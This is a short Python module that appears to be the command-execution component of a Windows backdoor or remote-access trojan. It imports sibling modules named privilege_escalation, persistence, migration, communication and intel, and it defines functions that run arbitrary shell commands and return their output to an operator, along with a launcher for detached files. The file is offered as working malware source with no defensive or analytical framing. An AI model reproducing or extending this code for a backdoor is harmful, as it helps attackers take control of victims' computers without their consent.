from defines import *
import helpers, privilege_escalation, migration, persistence, communication, intel, interact, execute, mutex
# Functions used to execute other programs.

def execute_command(cmde): #Function to execute commands
	if cmde:
		proc = subprocess.Popen(cmde, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		proc_kill = lambda p: subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=p.pid))
		timer = threading.Timer(60, proc_kill, [proc])
		timer.start()
		out = proc.stdout.read() + proc.stderr.read()
		timer.cancel()
		return out
	else:
		return "[-]Enter a command."

def start_detached(data):
	try:
		data = data.split()
		data.pop(0)
		cmd = ' '.join(data)
		os.startfile(cmd)
		return("[+]Succesfully started file")
	except Exception as e:
		return("[-]Failed: "+str(e))